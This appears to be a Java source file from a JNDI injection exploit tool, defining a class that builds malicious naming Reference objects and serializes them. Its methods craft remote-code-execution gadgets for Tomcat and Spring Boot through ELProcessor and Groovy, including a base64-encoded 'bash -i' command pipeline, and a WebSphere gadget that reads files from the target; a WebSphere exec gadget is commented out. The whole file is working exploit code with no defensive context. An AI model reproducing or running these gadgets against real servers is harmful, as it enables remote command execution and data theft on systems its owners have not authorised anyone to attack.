package jndi;

import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.Base64;
import java.util.Properties;

public class CommonRef {
    private URL codebase;
    private String command;

    public CommonRef(String command){
        this.command = command;
    }

    public CommonRef(URL codebase, String command){
        this.codebase = codebase;
        this.command = command;
    }

    public byte[] serialize(Object ref) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(ref);

        return out.toByteArray();
    }

    /*
     * Need : Tomcat 8+ or SpringBoot 1.2.x+ in classpath，because of javax.el.ELProcessor.
     */
    public ResourceRef execByEL() {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                this.command
        )));

        return ref;
    }

    /*
     * (GroovyClassLoader) Need : Tomcat and Groovy in classpath，because of groovy.lang.GroovyClassLoader.
     */
    public ResourceRef execByGroovy1() {
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        ref.add(new StringRefAddr("x", String.format(
                "@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef x\n",
                this.command
        )));

        return ref;
    }

    /*
     * (GroovyShell) Need : Tomcat and Groovy in classpath，because of groovy.lang.GroovyClassLoader.
     */
    public ResourceRef execByGroovy2() {
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", "'bash -c {echo," +
                Base64.getEncoder().encodeToString(this.command.getBytes()) +
                "}|{base64,-d}|{bash,-i}'.execute()"
        ));

        return ref;
    }

    /*
     * Need : WebSphere v6-v9, file content will stop util '#' or '?' or EOF.
     */
    public javax.naming.Reference readfileByWebsphere() {
        javax.naming.Reference ref = new Reference("ExploitObject",
                "com.ibm.ws.webservices.engine.client.ServiceFactory", null);
        ref.add(new StringRefAddr("WSDL location", this.codebase+"wsdl/list.wsdl"));
        ref.add(new StringRefAddr("service namespace","xxx"));
        ref.add(new StringRefAddr("service local part","yyy"));

        return ref;
    }

    /*
     * Need : WebSphere v6-v9, file content will stop util '#' or '?' or EOF.
     */
//    public javax.naming.Reference execByWebsphere() {
//        javax.naming.Reference ref = new Reference("ExportObject",
//                "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory", null);
//        Properties refProps = new Properties();
//        refProps.put("com.ibm.ws.client.classpath", this.codebase+"wsdl/upload.wsdl");
//        refProps.put("com.ibm.ws.client.classname", "xExportObject");
//        ref.add(new com.ibm.websphere.client.factory.jdbc.PropertiesRefAddr("JMSProperties", refProps));
//
//        return ref;
//    }

    /*
     * Need : WebSphere v6-v9, file content will stop util '#' or '?' or EOF.
     */

}
